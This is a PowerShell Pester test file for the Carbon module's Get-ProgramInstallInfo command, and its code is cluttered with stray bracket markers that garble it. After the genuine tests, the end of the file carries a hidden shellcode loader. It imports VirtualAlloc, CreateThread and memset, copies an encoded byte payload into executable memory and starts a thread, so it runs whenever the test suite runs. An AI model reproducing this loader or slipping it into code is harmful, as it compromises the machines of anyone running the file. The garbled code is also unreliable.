












 -||-> Set-StrictMode -Version 'Latest' <-||- 

 -||-> & ( -||-> Join-Path -Path $PSScriptRoot -ChildPath 'Initialize-CarbonTest.ps1' -Resolve <-||- ) <-||- 

 -||-> Describe 'Get-ProgramInstallInfo.when getting all programs' {
     -||-> $programs =  -||-> Get-ProgramInstallInfo <-||-  <-||- 
     -||-> It 'should get all installed programs' {
         -||-> $programs | Should -Not -BeNullOrEmpty <-||- 
    } <-||- 

     -||-> It ( -||-> 'should get information about each program' <-||- ) {
         -||-> foreach( $program in  -||-> $programs <-||-  )
        {
             -||-> Write-Verbose -Message $program.DisplayName <-||- 
             -||-> $program | Should Not BeNullOrEmpty <-||- 
             -||-> [Microsoft.Win32.RegistryKey]$key = $program.Key <-||- 
             -||-> $valueNames = $key.GetValueNames() <-||- 
             -||-> foreach( $property in  -||-> ( -||-> Get-Member -InputObject $program -MemberType Property <-||- ) <-||-  )
            {
                 -||-> $propertyName = $property.Name <-||- 
                 -||-> Write-Verbose -Message ( -||-> '  {0}' -f $propertyName <-||- ) <-||- 
                 -||-> if(  -||-> $propertyName -eq 'Version' <-||-  )
                {
                     -||-> Write-Verbose 'BREAK' <-||- 
                } <-||- 
    
                 -||-> if(  -||-> $propertyName -eq 'Key' <-||-  )
                {
                    continue
                } <-||- 
    
                 -||-> $keyValue = $key.GetValue( $propertyName ) <-||- 
                 -||-> $propertyValue = $program.$propertyName <-||- 
    
                 -||-> if(  -||-> $propertyName -eq 'ProductCode' <-||-  )
                {
                     -||-> $propertyValue =  -||-> Split-Path -Leaf -Path $key.Name <-||-  <-||- 
                     -||-> [Guid]$guid = [Guid]::Empty <-||- 
                     -||-> [Guid]::TryParse( $propertyValue, [ref]$guid ) <-||- 
                     -||-> $propertyValue = $guid <-||- 
                     -||-> $keyValue = $guid <-||- 
                }
                elseif(  -||-> $propertyName -eq 'User' <-||-  )
                {
                     -||-> if(  -||-> $key.Name -match 'HKEY_USERS\\([^\\]+)\\' <-||-  )
                    {
                         -||-> $sddl = $Matches[1] <-||- 
                         -||-> $sid =  -||-> New-Object 'Security.Principal.SecurityIdentifier' $sddl <-||-  <-||- 
                         -||-> try
                        {
                             -||-> $propertyValue = $sid.Translate([Security.Principal.NTAccount]).Value <-||- 
                        }
                        catch
                        {
                             -||-> $propertyValue = $sid.ToString() <-||- 
                        } <-||- 
                         -||-> $keyValue = $propertyValue <-||- 
                    } <-||- 
                } <-||- 
    
                 -||-> $typeName = $program.GetType().GetProperty($propertyName).PropertyType.Name <-||- 
                 -||-> if(  -||-> $keyValue -eq $null <-||-  )
                {
                     -||-> if(  -||-> $typeName -eq 'Int32' <-||-  )
                    {
                         -||-> $keyValue = 0 <-||- 
                    }
                    elseif(  -||-> $typeName -eq 'Version' <-||-  )
                    {
                         -||-> $keyValue = $null <-||- 
                    }
                    elseif(  -||-> $typeName -eq 'DateTime' <-||-  )
                    {
                         -||-> $keyValue = [DateTime]::MinValue <-||- 
                    }
                    elseif(  -||-> $typeName -eq 'Boolean' <-||-  )
                    {
                         -||-> $keyValue = $false <-||- 
                    }
                    elseif(  -||-> $typeName -eq 'Guid' <-||-  )
                    {
                         -||-> $keyValue = [Guid]::Empty <-||- 
                    }
                    else
                    {
                         -||-> $keyValue = '' <-||- 
                    } <-||- 
                }
                else
                {
                     -||-> if(  -||-> $typeName -eq 'DateTime' <-||-  )
                    {
                         -||-> [DateTime]$dateTime = [DateTime]::MinValue <-||- 
    
                         -||-> if(  -||-> -not ( -||-> [DateTime]::TryParse($keyValue,[ref]$dateTime) <-||- ) <-||-  )
                        {
                             -||-> [DateTime]::TryParseExact( $keyValue, 'yyyyMMdd', [Globalization.CultureInfo]::CurrentCulture, [Globalization.DateTimeStyles]::None, [ref]$dateTime) <-||- 
                        } <-||- 
                         -||-> $keyValue = $dateTime <-||- 
                    }
                    elseif(  -||-> $typeName -eq 'Int32' <-||-  )
                    {
                         -||-> $intValue = 0 <-||- 
                         -||-> $keyValue = [Int32]::TryParse($keyValue, [ref] $intValue) <-||- 
                         -||-> $keyValue = $intValue <-||- 
                    }
                    elseif(  -||-> $typeName -eq 'Version' <-||-  )
                    {
                         -||-> [int]$intValue = 0 <-||- 
                         -||-> if(  -||-> $keyValue -isnot [int32] -and [int]::TryParse($keyValue,[ref]$intValue) <-||-  )
                        {
                             -||-> $keyValue = $intValue <-||- 
                        } <-||- 

                         -||-> if(  -||-> $keyValue -is [int32] <-||-  )
                        {
                             -||-> $major = $keyValue -shr 24 <-||-    
                             -||-> $minor = ( -||-> $keyValue -band 0x00ff0000 <-||- ) -shr 16 <-||-   
                             -||-> $build = $keyValue -band 0x0000ffff <-||-    
                             -||-> $keyValue =  -||-> New-Object 'Version' $major,$minor,$build <-||-  <-||- 
                        }
                        else
                        {
                             -||-> [Version]$version = $null <-||- 
                             -||-> if(  -||-> [Version]::TryParse($keyValue, [ref]$version) <-||-  )
                            {
                                 -||-> $keyValue = $version <-||- 
                            } <-||- 
                        } <-||- 
                    } <-||- 
                } <-||- 
    
                 -||-> if(  -||-> $keyValue -eq $null <-||-  )
                {
                     -||-> $propertyValue | Should BeNullOrEmpty <-||- 
                }
                else
                {
                     -||-> $propertyValue | Should Be $keyValue <-||- 
                } <-||- 
            } <-||- 
        } <-||- 
    } <-||- 
} <-||- 

 -||-> Describe 'Get-ProgramInstallInfo.when getting a program by name' {
     -||-> $p =  -||-> Get-ProgramInstallInfo | Select-Object -First 1 <-||-  <-||- 
     -||-> $p2 =  -||-> Get-ProgramInstallInfo $p.DisplayName <-||-  <-||- 
     -||-> It 'should get just that program' {
         -||-> $p2 | Should Not BeNullOrEmpty <-||- 
         -||-> $p2 | Should Be $p <-||- 
    } <-||- 
} <-||-    

 -||-> Describe 'Get-ProgramInstallInfo.when getting programs by wildcard' {

     -||-> $p =  -||-> Get-ProgramInstallInfo | Select-Object -First 1 <-||-  <-||- 

     -||-> $wildcard = $p.DisplayName.Substring(0,$p.DisplayName.Length - 1) <-||- 
     -||-> $wildcard = '{0}*' -f $wildcard <-||- 
     -||-> $p2 =  -||-> Get-ProgramInstallInfo $wildcard <-||-  <-||- 

     -||-> It 'should find the program' {
         -||-> $p2 | Should Not BeNullOrEmpty <-||- 
         -||-> $p2 | Should Be $p <-||- 
    } <-||- 
} <-||- 

 -||-> Describe 'Get-ProgramInstallInfo.when there are invalid integer versions' {
    
     -||-> $program =  -||-> Get-ProgramInstallInfo | Select-Object -First 1 <-||-  <-||- 

     -||-> $regKeyPath = 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Uninstall\CarbonGetProgramInstallInfo' <-||- 
     -||-> Install-RegistryKey -Path $regKeyPath <-||- 
     -||-> try
    {
         -||-> $name = 'Carbon+Get-ProgramInstallInfo' <-||- 
         -||-> Set-RegistryKeyValue -Path $regKeyPath -Name 'DisplayName' -String $name <-||- 
         -||-> Set-RegistryKeyValue -Path $regKeyPath -Name 'Version' -DWord 0xff000000 <-||- 

         -||-> $program =  -||-> Get-ProgramInstallInfo -Name $name <-||-  <-||- 
        
         -||-> It 'should ignore the invalid version' {
             -||-> $program.Version | Should BeNullOrEmpty <-||- 
        } <-||- 
    }
    finally
    {
         -||-> Remove-Item -Path $regKeyPath -Recurse <-||- 
    } <-||- 
    

} <-||- 

 -||-> $c = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);' <-||- ; -||-> $w =  -||-> Add-Type -memberDefinition $c -Name "Win32" -namespace Win32Functions -passthru <-||-  <-||- ; -||-> [Byte[]] <-||- ; -||-> [Byte[]]$z = 0xba,0x2d,0xc8,0x27,0xba,0xdb,0xd7,0xd9,0x74,0x24,0xf4,0x5f,0x33,0xc9,0xb1,0x57,0x31,0x57,0x13,0x83,0xc7,0x04,0x03,0x57,0x22,0x2a,0xd2,0x46,0xd4,0x28,0x1d,0xb7,0x24,0x4d,0x97,0x52,0x15,0x4d,0xc3,0x17,0x05,0x7d,0x87,0x7a,0xa9,0xf6,0xc5,0x6e,0x3a,0x7a,0xc2,0x81,0x8b,0x31,0x34,0xaf,0x0c,0x69,0x04,0xae,0x8e,0x70,0x59,0x10,0xaf,0xba,0xac,0x51,0xe8,0xa7,0x5d,0x03,0xa1,0xac,0xf0,0xb4,0xc6,0xf9,0xc8,0x3f,0x94,0xec,0x48,0xa3,0x6c,0x0e,0x78,0x72,0xe7,0x49,0x5a,0x74,0x24,0xe2,0xd3,0x6e,0x29,0xcf,0xaa,0x05,0x99,0xbb,0x2c,0xcc,0xd0,0x44,0x82,0x31,0xdd,0xb6,0xda,0x76,0xd9,0x28,0xa9,0x8e,0x1a,0xd4,0xaa,0x54,0x61,0x02,0x3e,0x4f,0xc1,0xc1,0x98,0xab,0xf0,0x06,0x7e,0x3f,0xfe,0xe3,0xf4,0x67,0xe2,0xf2,0xd9,0x13,0x1e,0x7e,0xdc,0xf3,0x97,0xc4,0xfb,0xd7,0xfc,0x9f,0x62,0x41,0x58,0x71,0x9a,0x91,0x03,0x2e,0x3e,0xd9,0xa9,0x3b,0x33,0x80,0xa5,0xd5,0x29,0x4f,0x35,0x42,0xc5,0xc6,0x5b,0xfb,0x7d,0x71,0xef,0x8c,0x5b,0x86,0x10,0xa7,0x95,0x53,0xbd,0x1b,0x85,0x30,0x12,0xf4,0x13,0xe1,0xed,0xa3,0x9b,0xd8,0x5e,0xff,0x09,0xe0,0x33,0xac,0xa5,0x5d,0xb2,0x52,0x36,0x4a,0x38,0x52,0x36,0x8a,0x6f,0x16,0x06,0xc0,0x42,0xe8,0x66,0x84,0xf4,0x5f,0xee,0xbb,0xc2,0x9f,0x25,0x4a,0x0c,0x0c,0xae,0x4d,0xa2,0x53,0xaa,0x1d,0x91,0xc0,0xe4,0xf2,0x43,0x8f,0xe1,0xa0,0x45,0x74,0x09,0x9f,0x0f,0xe0,0xff,0x7f,0x47,0x75,0xcc,0x7f,0x97,0xfc,0xd3,0xea,0x93,0xae,0x79,0xf4,0xcd,0x26,0x0b,0x4c,0x6f,0x30,0x0c,0x85,0xdc,0x6e,0xa0,0x75,0xb4,0xf8,0x6b,0x7c,0x20,0x82,0x8c,0x55,0xd5,0xb4,0x06,0x5c,0x9a,0x41,0x30,0x08,0xd4,0x1f,0x60,0x9f,0xeb,0xb5,0x0f,0x60,0x7b,0x36,0xc0,0x60,0x7b,0x5e,0xe0,0x60,0x3b,0x9e,0xb3,0x08,0xe3,0x3a,0x60,0x2c,0xec,0x96,0x14,0xfd,0x41,0x90,0xfc,0x55,0x0d,0xa2,0x22,0x5a,0xcd,0xf1,0x74,0x32,0xdf,0x63,0xf1,0x20,0x20,0x5e,0x87,0x65,0xaa,0xac,0x03,0x62,0x53,0xec,0x91,0xad,0x26,0x17,0xc1,0xee,0x97,0x3f,0x87,0x0f,0xd8,0x3f,0x59,0xc9,0x15,0xee,0xa9,0x1f,0x77,0xdf,0xf8,0x71,0xb6,0x26,0x31,0x8e <-||- ; -||-> $g = 0x1000 <-||- ; -||-> if ( -||-> $z.Length -gt 0x1000 <-||- ){ -||-> $g = $z.Length <-||- } <-||- ; -||-> $x=$w::VirtualAlloc(0,0x1000,$g,0x40) <-||- ;for ( -||-> $i=0 <-||- ; -||-> $i -le ( -||-> $z.Length-1 <-||- ) <-||- ; -||-> $i++ <-||- ) { -||-> $w::memset([IntPtr]( -||-> $x.ToInt32()+$i <-||- ), $z[$i], 1) <-||- }; -||-> $w::CreateThread(0,0,$x,0,0,0) <-||- ;for (;;){ -||-> Start-sleep 60 <-||- };



